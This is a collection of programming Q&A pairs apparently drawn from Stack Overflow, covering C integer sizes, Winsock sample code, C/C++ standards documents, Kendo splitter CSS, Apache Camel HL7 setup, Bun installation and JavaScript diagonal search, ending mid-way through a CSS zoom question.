My question then, in essence, is why have the long if there will be instances of machines that make no use of its abilities?
From a K&R ebook:

The intent is that short and long should provide different lengths of integers where practical; int will
normally be the natural size for a particular machine. short is often 16 bits long, and int either 16 or
32 bits. Each compiler is free to choose appropriate sizes for its own hardware, subject only to the the
restriction that shorts and ints are at least 16 bits, longs are at least 32 bits, and short is no longer
than int, which is no longer than long.

Is there a ""rule of thumb,"" if you will, for when a machine's compiler will opt to allocate more memory for a long than an int? And vice versa? What is the criteria?
","
Is there a ""rule of thumb,"" if you will, for when a machine's compiler
  will opt to allocate more memory for a long than an int? And vice
  versa? What is the criteria?

The criterion is likely ""Will the target machine take advantage of a larger type?"" or ""Does the target machine have native registers and/or instructions which operate on this larger type?""
",c
kendo splitter not working well with angular on collapsing dynamic panels,"I'm using kendo-ui with angular for four horizontal panels.
when the last panel is toggled it opens and after resizing it if I close it by toggle, the space previously occupied by the last panel stays unoccupied by the adjacent panel
Upon closing the last panel, I want the adjacent panel to take up it's space
kendo version v17.2.0
Here's the stackblitz of the repo
https://stackblitz.com/edit/angular-m7fxze-lohztkxe?file=src%2Fapp%2Fapp.component.ts
steps to reproduce:

Click on Toogle 4th Panel button. This opens 4th panel on the right side.
Resize the last panel by using cursor.
Click on Toggle 4th panel, You observe the space previously occupied by 4th panel is empty.

Expectation:
Upon toggling 4th panel the space previously occupied by 4th panel should now be occupied by 3rd panel.
Thanks in advance
","The reason why the 3rd panel does not go back to fill the remaining space after resizing other panels is that the kendo splitter is managing the new user-determined widths using flex-basis: ##px and setting flex-grow: 0;.
This means that the panels are forced to use these set pixel widths and won't stretch to fill the parent.
A CSS solution is to find the last panel (<kendo-splitter-pane>) which is not hidden (i.e. has the .hidden class) and then force it to fill the remaining space using flex-grow: 1
kendo-splitter-pane:nth-last-child(1 of kendo-splitter-pane:not(.hidden)) {
    flex-grow: 1 !important;
}

Or an Angular solution is to apply this styling conditionally when the 4th panel is hidden
<kendo-splitter-pane [style.flexGrow]=""!panelLayout.resultData ? 1 : null"">
  ...
</kendo-splitter-pane>

See this stackblitz: https://stackblitz.com/edit/angular-m7fxze-z52qsndf?file=src%2Findex.html,src%2Fapp%2Fapp.component.ts
",javascript
how to configure apache camel with an hl7 listener and deploy intomcat,"I have been looking at using Camel in Tomcat to route HL7 data from a specified port to be processed by a persistence layer.  I am really struggling to understand how to do this. I am using the Tomcat without Spring code as a basic configuration example.  The Camel HL7 details are here.  I don't really understand how to change the uri (or create the appropriate web.xml and camel-config-xml files) so that it will listen for MLLP connections and then route to an appropriate processing class.  From the documentation the uri is:
mina:tcp://localhost:8888?sync=true&amp;codec=#hl7codec

So far, I have a spring-servlet.xml like this (with an error cvc-complex-type.2.4.c: The matching wildcard is strict, but no declaration can be found for element 'camel:camelContext'):
<?xml version=""1.0"" encoding=""UTF-8""?>
<beans xmlns=""http://www.springframework.org/schema/beans""
       xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
       xmlns:context=""http://www.springframework.org/schema/context""
       xmlns:jms=""http://www.springframework.org/schema/jms""
       xmlns:camel=""http://activemq.apache.org/camel/schema/spring""
       xsi:schemaLocation=""
            http://www.springframework.org/schema/beans
            http://www.springframework.org/schema/beans/spring-beans.xsd
            http://activemq.apache.org/camel/schema/spring
            http://activemq.apache.org/camel/schema/spring/camel-spring.xsd"">
  <bean id=""hl7codec"" class=""org.apache.camel.component.hl7.HL7MLLPCodec"">
    <property name=""charset"" value=""iso-8859-1""/>
</bean>

<bean id=""hl7MessageHandler"" class=""util.HL7MessageHandlerService""/>

<camelContext id=""hl7listener"" xmlns=""http://camel.apache.org/schema/spring"">
    <route>
        <from uri=""mina:tcp://localhost:8888?sync=true&amp;codec=#hl7codec""/>
        <to uri=""bean:hl7MessageHandler?method=lookupPatient""/>
    </route>
</camelContext>
</beans>

and a web.xml like this: 
<?xml version=""1.0"" encoding=""ISO-8859-1""?>
<web-app version=""2.4"" xmlns=""http://java.sun.com/xml/ns/j2ee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"">

  <display-name>HL7 Consumer</display-name>

  <!-- location of spring xml files -->
  <context-param>
    <param-name>contextConfigLocation</param-name>
    <param-value>classpath:spring-servlet.xml</param-value>
  </context-param>

  <listener>
    <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
  </listener>

  <servlet>
    <servlet-name>CamelServlet</servlet-name>
    <servlet-class>org.apache.camel.component.servlet.CamelHttpTransportServlet</servlet-class>
    <load-on-startup>1</load-on-startup>
  </servlet>

  <servlet-mapping>
    <servlet-name>CamelServlet</servlet-name>
    <url-pattern>/camel/*</url-pattern>
  </servlet-mapping>

</web-app>

I don't really understand how to configure Camel route and then to ensure that incoming messages are passed to the HL7MessageHandler.
","See this tutorial on using Apache Camel in a web application: http://camel.apache.org/tutorial-on-using-camel-in-a-web-application.html
Then you need to include the needed Camel components and its dependencies in the WAR file, eg the JARs in WEB-INF/lib.
",java
how to install bun via homebrew formula,"I want to install Bun via homebrew but I cannot find a formula to install it.
","Before installing, you need to tap the repo:
brew tap oven-sh/bun
brew install bun

",javascript
line keyword in c,"I am trying to understand some code and I've come across a keyword that I've never seen before. I tried to google it, but haven't found anything regarding it as well.
char *valtext;
#line 1 ""Values.l""
#define INITIAL 0
#line 2 ""Values.l""
int reserve(char *s);
#line 388 ""lex.val.c""

I've included the entire block hoping that perhaps someone can help me understand this chunk of code. I can't find any files on my system named ""Values.l"" and this chunk of code is located in the ""lex.val.c"" file.
Thanks in advance.
","The line directive:
http://msdn.microsoft.com/en-US/library/b5w2czay%28v=VS.80%29.aspx
",c
running the microsoft winsock client and server code sample,"I've downloaded and successfully compiled the Microsoft Winsock Client and Server Code Sample from here. This client server combination application both work just fine running on the same computer. However it only works when the client is supplied via command line with the host computer name or with the local IPv4 Address but not when ""localhost"" or 127.0.0.1 is supplied. How can I modify this sample code so that it works when ""localhost"" or 127.0.0.1 is supplied via command line to the client executable ? Can what I'm asking be done ?
Here is the client code:
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>


// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, ""Ws2_32.lib"")
#pragma comment (lib, ""Mswsock.lib"")
#pragma comment (lib, ""AdvApi32.lib"")


#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT ""27015""

int __cdecl main(int argc, char **argv) 
{
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL,
                       *ptr = NULL,
                       hints;
    const char *sendbuf = ""this is a test"";
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;

    // Validate the parameters
    if (argc != 2) {
        printf(""usage: %s server-name\n"", argv[0]);
        return 1;
    }

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        printf(""WSAStartup failed with error: %d\n"", iResult);
        return 1;
    }

    ZeroMemory( &hints, sizeof(hints) );
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo(argv[1], DEFAULT_PORT, &hints, &result);
    if ( iResult != 0 ) {
        printf(""getaddrinfo failed with error: %d\n"", iResult);
        WSACleanup();
        return 1;
    }

    // Attempt to connect to an address until one succeeds
    for(ptr=result; ptr != NULL ;ptr=ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, 
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            printf(""socket failed with error: %ld\n"", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        // Connect to server.
        iResult = connect( ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf(""Unable to connect to server!\n"");
        WSACleanup();
        return 1;
    }

    // Send an initial buffer
    iResult = send( ConnectSocket, sendbuf, (int)strlen(sendbuf), 0 );
    if (iResult == SOCKET_ERROR) {
        printf(""send failed with error: %d\n"", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    printf(""Bytes Sent: %ld\n"", iResult);

    // shutdown the connection since no more data will be sent
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf(""shutdown failed with error: %d\n"", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    // Receive until the peer closes the connection
    do {

        iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
        if ( iResult > 0 )
            printf(""Bytes received: %d\n"", iResult);
        else if ( iResult == 0 )
            printf(""Connection closed\n"");
        else
            printf(""recv failed with error: %d\n"", WSAGetLastError());

    } while( iResult > 0 );

    // cleanup
    closesocket(ConnectSocket);
    WSACleanup();

    return 0;
}

Here is the original server source code:
#undef UNICODE

#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>

// Need to link with Ws2_32.lib
#pragma comment (lib, ""Ws2_32.lib"")
// #pragma comment (lib, ""Mswsock.lib"")

#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT ""27015""

int __cdecl main(void) 
{
    WSADATA wsaData;
    int iResult;

    SOCKET ListenSocket = INVALID_SOCKET;
    SOCKET ClientSocket = INVALID_SOCKET;

    struct addrinfo *result = NULL;
    struct addrinfo hints;

    int iSendResult;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        printf(""WSAStartup failed with error: %d\n"", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    // Resolve the server address and port
    iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
    if ( iResult != 0 ) {
        printf(""getaddrinfo failed with error: %d\n"", iResult);
        WSACleanup();
        return 1;
    }

    // Create a SOCKET for the server to listen for client connections.
    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ListenSocket == INVALID_SOCKET) {
        printf(""socket failed with error: %ld\n"", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    // Setup the TCP listening socket
    iResult = bind( ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        printf(""bind failed with error: %d\n"", WSAGetLastError());
        freeaddrinfo(result);
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    freeaddrinfo(result);

    iResult = listen(ListenSocket, SOMAXCONN);
    if (iResult == SOCKET_ERROR) {
        printf(""listen failed with error: %d\n"", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    // Accept a client socket
    ClientSocket = accept(ListenSocket, NULL, NULL);
    if (ClientSocket == INVALID_SOCKET) {
        printf(""accept failed with error: %d\n"", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    // No longer need server socket
    closesocket(ListenSocket);

    // Receive until the peer shuts down the connection
    do {

        iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
        if (iResult > 0) {
            printf(""Bytes received: %d\n"", iResult);

            // Echo the buffer back to the sender
            iSendResult = send( ClientSocket, recvbuf, iResult, 0 );
            if (iSendResult == SOCKET_ERROR) {
                printf(""send failed with error: %d\n"", WSAGetLastError());
                closesocket(ClientSocket);
                WSACleanup();
                return 1;
            }
            printf(""Bytes sent: %d\n"", iSendResult);
        }
        else if (iResult == 0)
            printf(""Connection closing...\n"");
        else  {
            printf(""recv failed with error: %d\n"", WSAGetLastError());
            closesocket(ClientSocket);
            WSACleanup();
            return 1;
        }

    } while (iResult > 0);

    // shutdown the connection since we're done
    iResult = shutdown(ClientSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf(""shutdown failed with error: %d\n"", WSAGetLastError());
        closesocket(ClientSocket);
        WSACleanup();
        return 1;
    }

    // cleanup
    closesocket(ClientSocket);
    WSACleanup();

    return 0;
}

","I thought I would post my solution to this question in hopes that someone might see a fault in this modification. However this slight change in the server code allows the client executable to connect to the server running on the same computer using either ""localhost"" or 127.0.0.1 supplied command line argument to the client executable.The change is simply by replacing the first parameter from NULL to ""127.0.0.1"" of the getaddrinfo function.
    // Resolve the server address and port
    iResult = getaddrinfo(""127.0.0.1"", DEFAULT_PORT, &hints, &result);
    if ( iResult != 0 ) {
        printf(""getaddrinfo failed with error: %d\n"", iResult);
        WSACleanup();
        return 1;
    }

EDIT:
Another method would be as follows:
Change server code from:
hints.ai_family = AF_UNSPEC;

to:
hints.ai_family = AF_INET;

",c
where do i find the current c or c standard documents,"For many questions the answer seems to be found in ""the standard"". However, where do we find that? Preferably online.
Googling can sometimes feel futile, again especially for the C standards, since they are drowned in the flood of discussions on programming forums.
To get this started, since these are the ones I am searching for right now, where are there good online resources for:

C89
C99
C11
C++98
C++03
C++11
C++14
C++17

","PDF versions of the standard
As of 1st September 2014 March 2022, the best locations by price for the official C and C++ standards documents in PDF seem to be:

C++20 – ISO/IEC 14882:2020: 212 CAD (about $165 US) from csagroup.org

C++17 – ISO/IEC 14882:2017: $90 NZD (about $65 US) from Standards New Zealand

C++14 – ISO/IEC 14882:2014: $90 NZD (about $65 US) from Standards New Zealand

C++11 – ISO/IEC 14882-2011: $60 from ansi.org or $60 from Techstreet

C++03 – INCITS/ISO/IEC 14882:2003: $30 from ansi.org

C++98 – ISO/IEC 14882:1998: $95 NZD (about $65 US) from Standards New Zealand

C17/C18 – INCITS/ISO/IEC 9899:2018: $116 from INCITS/ANSI / N2176 / c17_updated_proposed_fdis.pdf draft from November 2017 (Link broken, see Wayback Machine N2176)

C11 – ISO/IEC 9899:2011: $60 from ansi.org / WG14 draft version N1570

C99 – INCITS/ISO/IEC 9899-1999(R2005): $60 from ansi.org / WG14 draft version N1256

C90 – ISO/IEC 9899:1990: $90 NZD (about $65 USD) from Standards New Zealand


Non-PDF electronic versions of the standard
Warning: most copies of standard drafts are published in PDF format, and errors may have been introduced if the text/HTML was transcribed or automatically generated from the PDF.

latest C standard – ISO Online Browsing Platform, viewable but not downloadable: (https://www.iso.org/obp/ui/#iso:std:iso-iec:9899)
C89 – Draft version in ANSI text format: (https://web.archive.org/web/20161223125339/http://flash-gordon.me.uk/ansi.c.txt)
C89 – Draft version as HTML document: (https://port70.net/~nsz/c/c89/c89-draft.html)
C90 TC1; ISO/IEC 9899 TCOR1, single-page HTML document: (https://www.open-std.org/jtc1/sc22/wg14/www/docs/tc1.htm)
C90 TC2; ISO/IEC 9899 TCOR2, single-page HTML document: (https://www.open-std.org/jtc1/sc22/wg14/www/docs/tc2.htm)
C99 – Draft version (N1256) as HTML document: (https://port70.net/~nsz/c/c99/n1256.html)
C11 – Draft version (N1570) as HTML document: (https://port70.net/~nsz/c/c11/n1570.html)
C++11 – Working draft (N3337) as plain text document: (https://port70.net/~nsz/c/c%2B%2B/c%2B%2B11_n3337.txt)

(The site hosting the plain text version of the C++11 working draft also has some C++14 drafts in this format. But none of them are copies of the final working draft, N4140.)
Print versions of the standard
Print copies of the standards are available from national standards bodies and ISO but are very expensive.
If you want a hard copy of the C90 standard for much less money than above, you may be able to find a cheap used copy of Herb Schildt's book The Annotated ANSI Standard at Amazon, which contains the actual text of the standard (useful) and commentary on the standard (less useful - it contains several dangerous and misleading errors).
The C99 and C++03 standards are available in book form from Wiley and the BSI (British Standards Institute):

C++03 Standard on Amazon
C99 Standard on Amazon

Standards committee draft versions (free)
The working drafts for future standards are often available from the committee websites:

C++ committee website
C committee website

If you want to get drafts from the current or earlier C/C++ standards, there are some available for free on the internet:
For C:

ANSI X3.159-198 (C89):
I cannot find a PDF of C89, but it is almost the same as C90. The only major differences are in the boilerplate and section numbering, although there are some slight textual differences

ISO/IEC 9899:1990 (C90):
(Almost the same as ANSI X3.159-198 (C89) except for the frontmatter and section numbering. There is at least one textual difference in section 6.5.7 (previously 3.5.7), where ""a list"" became ""a brace-enclosed list"". Note that the conversion between ANSI and ISO/IEC Standard is seen inside this document, the document refers to its name as ""ANSI/ISO: 9899/99"" although this isn't the right name of the later made standard of it, the right name is ""ISO/IEC 9899:1990"")

TC1 for C90: https://www.open-std.org/jtc1/sc22/wg14/www/docs/n423.pdf

There isn't a PDF link for TC2 on the WG14 website, sadly.

ISO/IEC 9899:1999 (C99 incorporating all three Technical Corrigenda):
https://www.open-std.org/jtc1/sc22/wg14/www/docs/n1256.pdf

An earlier version of C99 incorporating only TC1 and TC2:
https://www.open-std.org/jtc1/sc22/wg14/www/docs/n1124.pdf

Working draft for the original (i.e. pre-corrigenda) C99: https://www.open-std.org/jtc1/sc22/wg14/www/docs/n843.htm (HTML) and https://web.archive.org/web/20240307022041/http://std.dkuug.dk/JTC1/SC22/WG14/www/docs/n843.pdf (PDF).
Note that there were two later working drafts: N869 and N878, but they seem to have been removed from the WG14 website, so this is the latest one available.

List of changes between C89/C90 and C99: https://port70.net/~nsz/c/c89/c9x_changes.html

TC1 for C99 (only the TC, not the standard incorporating it): https://www.open-std.org/jtc1/sc22/wg14/www/docs/9899tc1/n32071.PDF

TC2 for C99 (only the TC, not the standard incorporating it): https://www.open-std.org/jtc1/sc22/wg14/www/docs/9899-1999_cor_2-2004.pdf

ISO/IEC 9899:2011 (C11):
https://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf
For information on the differences between N1570 and the final, published version of C11, see Latest changes in C11 and https://groups.google.com/g/comp.std.c/c/v5hsWOu5vSw

ISO/IEC 9899:2011/Cor 1:2012 (C11's only technical corrigendum): This can be viewed at https://www.iso.org/obp/ui/#iso:std:iso-iec:9899:ed-3:v1:cor:1:v1:en but cannot be downloaded. It is the actual corrigendum, not a draft.

ISO/IEC 9899:2018 (C17/C18):
https://web.archive.org/web/20181230041359if_/http://www.open-std.org/jtc1/sc22/wg14/www/abq/c17_updated_proposed_fdis.pdf (N2176)

C23 work-in-progress - latest working draft as of April 1st, 2023 (N3096): https://www.open-std.org/jtc1/sc22/wg14/www/docs/n3096.pdf

C2y work-in-progress - latest working draft as of July 26, 2024 (N3301): https://www.open-std.org/jtc1/sc22/wg14/www/docs/n3301.pdf


For C++:

ISO/IEC 14882:1998 (C++98):
https://web.archive.org/web/20221121042402/http://www.lirmm.fr/~ducour/Doc-objets/ISO+IEC+14882-1998.pdf

ISO/IEC 14882:2003 (C++03):
https://web.archive.org/web/20180922024431/https://cs.nyu.edu/courses/fall11/CSCI-GA.2110-003/documents/c++2003std.pdf

ISO/IEC 14882:2011 (C++11):
https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2012/n3337.pdf

ISO/IEC 14882:2014 (C++14):
https://github.com/cplusplus/draft/blob/master/papers/n4140.pdf?raw=true

ISO/IEC 14882:2017 (C++17):
https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2017/n4659.pdf

ISO/IEC 14882:2020 (C++20): https://isocpp.org/files/papers/N4860.pdf

ISO/IEC 14882:2023 (C++23): https://open-std.org/jtc1/sc22/wg21/docs/papers/2023/n4950.pdf


Note that these documents are not the same as the standard, though the versions just prior to the meetings that decide on a standard are usually very close to what is in the final standard. The FCD (Final Committee Draft) versions are password protected; you need to be on the standards committee to get them.
Even though the draft versions might be very close to the final ratified versions of the standards, some of this post's editors would strongly advise you to get a copy of the actual documents — especially if you're planning on quoting them as references. Of course, starving students should go ahead and use the drafts if strapped for cash.

It appears that, if you are willing and able to wait a few months after ratification of a standard, to search for ""INCITS/ISO/IEC"" instead of ""ISO/IEC"" when looking for a standard is the key. By doing so, one of this post's editors was able to find the C11 and C++11 standards at reasonable prices. For example, if you search for ""INCITS/ISO/IEC 9899:2011"" instead of ""ISO/IEC 9899:2011"" on webstore.ansi.org you will find the reasonably priced PDF version.

The site https://wg21.link/ provides short-URL links to the C++ current working draft and draft standards, and committee papers:

https://wg21.link/std11 - C++11
https://wg21.link/std14 - C++14
https://wg21.link/std17 - C++17
https://wg21.link/std20 - C++20
https://wg21.link/std - current working draft (as of May 2022 still points to the 2021 version)


The current draft of the standard is maintained as LaTeX sources on Github. These sources can be converted to HTML using cxxdraft-htmlgen. The following sites maintain HTML pages so generated:

Tim Song - Current working draft - C++11 - C++14 - C++17 - C++20
Eelis - Current working draft

Tim Song also maintains generated HTML and PDF versions of the Networking TS and Ranges TS.
POSIX extensions to the C standard
The POSIX standard (IEEE 1003.1) requires a compliant operating system to include a C compiler. This compiler must in turn be compliant with the C standard, and must also support various extensions defined in the ""System Interfaces"" section of POSIX (such as the off_t data type, the <aio.h> header, the clock_gettime() function and the _POSIX_C_SOURCE macro.)
So if you've tried to look up a particular function, been informed ""This function is part of POSIX, not the C standard"", and wondered why an operating system standard was mandating compiler features and language extensions... now you know!

POSIX.1-2001: The System Interfaces section can be downloaded as a separate document from https://mirror.math.princeton.edu/pub/oldlinux/download/c951.pdf. Section 1.7 states that the relevant version of the C standard is C99.
The ""Shell and Utilities"" section (https://mirror.math.princeton.edu/pub/oldlinux/download/c952.pdf) mandates not only that a C99-compliant compiler should exist, but that it should be invokable from the command line under the name ""c99"". One way in which this can be implemented is to place a shell script called ""c99"" in /usr/bin, which calls gcc with the -std=c99 option added to the list of command-line parameters, and blocks any competing standards from being specified.
POSIX.1-2001 had two technical corrigenda, one dated 2002 and one dated 2004. I don't think they're incorporated into the documents as linked above. There's an online HTML version incorporating the corrigenda at https://pubs.opengroup.org/onlinepubs/009695399/ - but I should add that I've had some trouble with the search box and so using Google to search the site is probably your best bet.
There is a paywalled link to download the first corrigendum at https://standards.ieee.org/standard/1003_1-2001-Cor1-2002.html.
There is also a paywalled link for the second at https://standards.ieee.org/standard/1003_1-2001-Cor2-2004.html



There is a draft version of POSIX.1-2008 at https://www.open-std.org/jtc1/sc22/open/n4217.pdf.
POSIX.1-2008 also had two technical corrigenda, the latter of the two being dated 2016. There is an online HTML version of the standard incorporating the corrigenda at https://pubs.opengroup.org/onlinepubs/9699919799.2016edition/ - though, again, I have had situations where the site's own search box wasn't good for finding information.

There is an online HTML version of POSIX.1-2017 at https://pubs.opengroup.org/onlinepubs/9699919799/ - though, again, I recommend using Google instead of that site's searchbox. According to the Open Group website ""IEEE 1003.1-2017 ... is a revision to the 1003.1-2008 standard to rollup the standard including its two technical corrigenda (as-is)"". Linux manpages describe it as ""technically identical"" to POSIX.1-2008 with Technical Corrigenda 1 and 2 applied. This is therefore not a major revision and does not change the value of the _POSIX_C_SOURCE macro.

There is an online HTML version of POSIX.1-2024 (currently the latest version of POSIX.1) at https://pubs.opengroup.org/onlinepubs/9799919799/ - though, once again, I still recommend using Google instead of the site's searchbox. The Open Group website referred in 2019 to ""a major revision anticipated to be available in 2023"", and consistent with this, the _POSIX_C_SOURCE macro has a new value of 202405L to indicate POSIX.1-2024. (source: https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap02.html)


",c
how to get a all elements right right up diagonal and right downdiagonal from the current element in matrix,"I am supposed to solve 8 queens problem for college, and one of the steps I am trying to do right now is to solve how to get all queens right and diagonal up and down from the current element. Can anyone help me with that. What I have so far is this:
const prazno = ""P"";
const kraljica = ""K"";

let arr = [
    [prazno,prazno,prazno,prazno,prazno,prazno,prazno,prazno],
    [prazno,prazno,prazno,prazno,prazno,prazno,prazno,prazno],
    [prazno,prazno,prazno,prazno,prazno,prazno,prazno,prazno],
    [prazno,prazno,prazno,kraljica,prazno,prazno,prazno,prazno],
    [kraljica,prazno,prazno,prazno,kraljica,prazno,prazno,prazno],
    [prazno,kraljica,prazno,prazno,prazno,kraljica,prazno,kraljica],
    [prazno,prazno,kraljica,prazno,prazno,prazno,kraljica,prazno],
    [prazno,prazno,prazno,prazno,prazno,prazno,prazno,prazno]];

arr.forEach(a=>{console.log(a)});

prazno (P) is empty, and kraljica (K) is queen. By the way
This is how it should look:
[ 'P', 'P', 'P', 'P', 'P', 'P', 'P', 'P' ]
[ 'P', 'P', 'P', 'P', 'P', 'P', 'P', 'P' ]
[ 'P', 'P', 'P', 'P', 'P', 'P', 'P', 'P' ]
[ 'P', 'P', 'P', 'K', 'P', 'P', 'P', 'P' ]
[ 'K', 'P', 'P', 'P', 'K', 'P', 'P', 'P' ]
[ 'P', 'K', 'P', 'P', 'P', 'K', 'P', 'K' ]
[ 'P', 'P', 'K', 'P', 'P', 'P', 'K', 'P' ]
[ 'P', 'P', 'P', 'P', 'P', 'P', 'P', 'P' ]

Trying to do addition of all queens diagonally from the current or right from it. I tried diagonally, but soon figured I can only do those on the point where two meet, using this code:
const dijagonalniZbir = arr => {
    let dijagonalniZbir = 0;
    for(let i = 0; i < arr.length; i++){
       for(let j = 0; j < arr[i].length; j++){
          if(i === j && arr[i][j]=='K'){
            dijagonalniZbir++;
          };
       };
    };
    return dijagonalniZbir;
 };

But sadly this is only for diagonal again where both i and j match, I need this for the current element, and not the whole array as well.
","Sorry, had to change to ""Q"" & ""E"" (the example is smaller), also added some queens, so all diagonals (starting from 3,3) hold at least one queen:


const e = ""E""; // Empty
const q = ""Q""; // Queen

let arr = [
  [q, e, e, e, e, e, e, e],
  [e, e, e, e, e, e, e, e],
  [e, e, e, e, q, e, e, e],
  [e, e, e, q, e, e, e, e],
  [q, e, e, e, q, e, e, e],
  [e, q, e, e, e, q, e, q],
  [e, e, q, e, e, e, q, e],
  [e, e, e, e, e, e, e, e]
];

// utility to check if there's a queen
// on the coordinates
const isQueen = ({ x, y, arr }) => {
  return arr[y][x] === q
}

// extracted functions to calculate diagonals
const getNext = {
  'downRight': ({ x, y }) => [x + 1, y + 1],
  'upLeft': ({ x, y }) => [x - 1, y - 1],
  'upRight': ({ x, y }) => [x + 1, y - 1],
  'downLeft': ({ x, y }) => [x - 1, y + 1],
}

// recursive function to gather all coordinates
// of queens in one diagonal direction (actually,
// this would work with any direction - only
// the getNext[something] function sets the
// pattern)
const getDiagonal = (direction) => {
  return ({ x, y, arr }) => {
    let ret = []
    const [xNext, yNext] = getNext[direction]({ x, y })
    
    // checking if next x, y coordinates are ""in"" the array
    if (arr[xNext] == null || arr[yNext] == null) {
      // if not, then recursion stops, an empty
      // array is returned
      return ret
    } else {
      // if yes, then check if they hold a queen
      if (isQueen({ x: xNext, y: yNext, arr })) {
        // if there's a queen on the next cordinates
        // then push those coordinates to the return array
        ret = [...ret, [xNext, yNext]]
      }
      
      // recursion goes: call the function with xNext, yNext -
      // and the checking starts from ""let ret = []"" again,
      // only with different x and y coordinates
      return [...ret, ...getDiagonal(direction)({ x: xNext, y: yNext, arr })]
    } 
  }
}

// creating the actual functions from the general
// getDiagonal
const getAllDownRight = getDiagonal('downRight')
const getAllUpLeft = getDiagonal('upLeft')
const getAllDownLeft = getDiagonal('downLeft')
const getAllUpRight = getDiagonal('upRight')

// setting starting position
const current = { x: 3, y: 3 }

// running the functions to see the queens
const downRight = getAllDownRight({ ...current, arr })
const upLeft = getAllUpLeft({ ...current, arr })
const upRight = getAllUpRight({ ...current, arr })
const downLeft = getAllDownLeft({ ...current, arr })

// output
console.log(downRight)
console.log(upLeft)
console.log(upRight)
console.log(downLeft)



The algorithm (thinking) in steps:

let's have x and y as the starting coordinates
let's choose the easiest diagonal: down and right (easiest, because that's just a +1 for x and y). Let's call them xNext & yNext, respectively
how do you check if there's a queen one step away? Simple: arr[y + 1][x + 1] -> arr[yNext][xNext] and look there if it's a queeny (isQeen())
how do you check if there's a queen two steps away? Simple: arr[y + 2][x + 2] -> arr[yNext + 1][xNext + 1] It looks the same as in the beginning, only the x and y changed to xNext and yNext... hmmm... can this pattern be used? Of course! Create a recursive function that automatically change xNext & yNext based on a rule of adding 1 to them AND check isQueen; then repeat. When should it stop? On the ""edge of the chessboard"" (if the arr[yNext][xNext] is undefined, the algorithm reached the end of the chessboard.)
how to generalize this, so we can use it for the different diagonals? The other diagonals are nothing else (to this function) only a different set of changes in the x and y coordinates.

This is all that's in the snippet above.
",javascript
css transformorigin  scale triggers offset while zooming to cursor point,"I'm trying to implement zoom in/out functionality for regular div elements (not canvas) by using transform origin and scale CSS properties. Everything works as expected, except that after changing the cursor's coordinates and then resizing, there is some offset. After that, zooming in and out works fine. The issue repeats after moving the cursor. The larger the zoom level, the greater the offset. I'm having difficulty identifying the pattern and adjusting the values I pass to transform-origin.
https://stackblitz.com/edit/web-platform-teguvc?file=script.js


const container = document.querySelector('.container');
const map = document.querySelector('.map');

const scaleStep = 0.2;
let scale = 1;

container.addEventListener('wheel', (event) => {
  event.preventDefault();

  if (!event.ctrlKey) {
    return;
  }

  event.deltaY < 0 ? (scale += scaleStep) : (scale -= scaleStep);

  const originX = container.scrollLeft + event.clientX;
  const originY = container.scrollTop + event.clientY;

  map.style.transformOrigin = `${originX}px ${originY}px`;
  map.style.transform = `scale(${scale})`;
});
body * {
  box-sizing: border-box;
}

.container {
  width: 90vw;
  height: 90vh;
  border: 2px solid blue;
  padding: 10px;
}

.map {
  width: 100%;
  height: 100%;
  border: 2px solid aqua;
}

#node-1 {
  position: absolute;
  left: 50px;
  top: 50px;
}

#node-2 {
  position: absolute;
  left: 150px;
  top: 150px;
}

#node-3 {
  position: absolute;
  left: 250px;
